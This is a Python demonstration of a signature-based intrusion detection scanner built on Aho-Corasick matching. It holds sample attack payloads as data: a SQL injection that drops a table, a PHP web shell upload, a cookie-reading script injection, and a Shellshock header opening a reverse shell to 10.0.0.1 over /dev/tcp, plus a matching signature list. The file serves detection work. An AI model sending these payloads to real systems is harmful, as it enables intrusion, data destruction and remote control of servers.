import sys
import time
from pathlib import Path

# Resolve project root so imports work from any working directory
root_dir = Path(__file__).resolve().parent.parent
sys.path.append(str(root_dir))

try:
    from core.aho_corasick import AhoCorasick
except ImportError:
    print("Error: Ensure 'core/aho_corasick.py' and 'core/__init__.py' exist.")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Simulated Network Intrusion Detection System (IDS)
# ---------------------------------------------------------------------------

# Simplified network packet payloads (ASCII representation of raw bytes)
PACKET_PAYLOADS = [
    (
        "P-001",
        (
            "GET /admin/login HTTP/1.1\r\nHost: target.internal\r\n"
            "User-Agent: sqlmap/1.6\r\nAccept: */*\r\n\r\n"
            "' OR '1'='1'; DROP TABLE users; --"
        ),
    ),
    (
        "P-002",
        (
            "POST /api/v2/upload HTTP/1.1\r\nContent-Type: multipart/form-data\r\n"
            "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n"
            "<?php system($_GET['cmd']); ?>"
        ),
    ),
    (
        "P-003",
        (
            "GET /index.html HTTP/1.1\r\nHost: example.com\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n\r\n"
        ),
    ),
    (
        "P-004",
        (
            "SEARCH / HTTP/1.1\r\nHost: sharepoint.corp\r\n"
            "<script>alert(document.cookie)</script>\r\n"
            "Translate: f\r\n\r\n"
        ),
    ),
    (
        "P-005",
        (
            "GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: legacy.server\r\n"
            "Referer: () { :;}; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\r\n\r\n"
        ),
    ),
]

# IDS signature dictionary — each entry is a known attack indicator
IDS_SIGNATURES = [
    # SQL Injection
    "' OR '",
    "DROP TABLE",
    "UNION SELECT",
    "1=1",
    "sqlmap",
    # Remote Code Execution / Shell Upload
    "<?php",
    "system($_GET",
    "shell.php",
    # Cross-Site Scripting (XSS)
    "<script>",
    "alert(document.cookie)",
    "document.cookie",
    # Path Traversal
    "../etc/passwd",
    "../../",
    # Shell Injection / Shellshock
    "/bin/bash",
    "() { :;};",
    "/dev/tcp",
    # User-Agent anomalies (known scanner fingerprints)
    "sqlmap",
    "nikto",
    "masscan",
]


def separator(char: str = "-", width: int = 68) -> None:
    print(char * width)


def run_ids_scanner() -> None:
    separator("=")
    print("SYSTEM: NETWORK INTRUSION DETECTION ENGINE")
    print("ALGORITHM: AHO-CORASICK MULTI-PATTERN MATCHING")
    separator("=")
    print()

    # ------------------------------------------------------------------
    # Step 1: Build the Aho-Corasick Automaton from signatures
    # ------------------------------------------------------------------
    print(f"[DATA] Signature dictionary size  : {len(IDS_SIGNATURES)} patterns")
    total_sig_len = sum(len(s) for s in IDS_SIGNATURES)
    print(f"[DATA] Total signature characters : {total_sig_len}")
    print()

    print("[PROCESSING] Building Aho-Corasick automaton from signatures...")
    t0 = time.perf_counter()
    ac = AhoCorasick(IDS_SIGNATURES)
    t1 = time.perf_counter()
    build_ms = (t1 - t0) * 1000

    print(f"[OK] Automaton built in {build_ms:.4f} ms  (O(M))")
    separator()
    print()

    # ------------------------------------------------------------------
    # Step 2: Scan each packet through the automaton
    # ------------------------------------------------------------------
    separator("=")
    print("PACKET SCAN RESULTS")
    separator("=")
    print()

    total_scan_ms = 0.0
    total_matches = 0
    threats_detected = 0

    for packet_id, payload in PACKET_PAYLOADS:
        t0 = time.perf_counter()
        matches = ac.search(payload)
        t1 = time.perf_counter()
        scan_ms = (t1 - t0) * 1000
        total_scan_ms += scan_ms
        total_matches += len(matches)

        is_threat = len(matches) > 0
        if is_threat:
            threats_detected += 1

        status = "ALERT  *** THREAT DETECTED ***" if is_threat else "CLEAN  (no signatures matched)"
        print(f"  Packet {packet_id}  |  {status}")
        print(f"    Payload length : {len(payload)} bytes")
        print(f"    Scan time      : {scan_ms:.4f} ms  (O(N + Z))")
        print(f"    Matches found  : {len(matches)}")

        if matches:
            # Report each unique matched signature with its position
            seen = set()
            for start, end, pattern in matches:
                if pattern not in seen:
                    seen.add(pattern)
                    snippet_start = max(0, start - 10)
                    snippet_end = min(len(payload), end + 10)
                    snippet = payload[snippet_start:snippet_end].replace("\r\n", "\\r\\n")
                    print(f"      >> Signature: \"{pattern}\"  at [{start}:{end}]")
                    print(f"         Context  : \"...{snippet}...\"")
        print()

    # ------------------------------------------------------------------
    # Step 3: Targeted keyword scan (demonstrate contains_any)
    # ------------------------------------------------------------------
    separator("=")
    print("QUICK TRIAGE SCAN (contains_any)")
    separator("=")
    critical_patterns = ["DROP TABLE", "<?php", "/bin/bash", "<script>"]
    quick_ac = AhoCorasick(critical_patterns)
    print(f"  Critical-threat signatures: {critical_patterns}")
    print()
    for packet_id, payload in PACKET_PAYLOADS:
        flagged = quick_ac.contains_any(payload)
        flag_str = "CRITICAL THREAT" if flagged else "safe"
        print(f"  Packet {packet_id} -> {flag_str}")
    print()

    # ------------------------------------------------------------------
    # Summary Report
    # ------------------------------------------------------------------
    separator("=")
    print("EXECUTION SUMMARY")
    separator("=")
    total_bytes = sum(len(p) for _, p in PACKET_PAYLOADS)
    total_ms = build_ms + total_scan_ms
    print(f"  Automaton Build (O(M))       : {build_ms:.4f} ms  [{len(IDS_SIGNATURES)} signatures, {total_sig_len} chars]")
    print(f"  Total Packet Bytes Scanned   : {total_bytes} bytes across {len(PACKET_PAYLOADS)} packets")
    print(f"  Total Scan Time (O(N+Z))     : {total_scan_ms:.4f} ms")
    print(f"  Total Matches Found          : {total_matches}")
    print(f"  Packets Flagged as Threats   : {threats_detected} / {len(PACKET_PAYLOADS)}")
    print(f"  End-to-End Time              : {total_ms:.4f} ms")
    separator("=")
    print("RESULT: IDS scan complete using Aho-Corasick multi-pattern matching.")
    separator("=")


if __name__ == "__main__":
    run_ids_scanner()
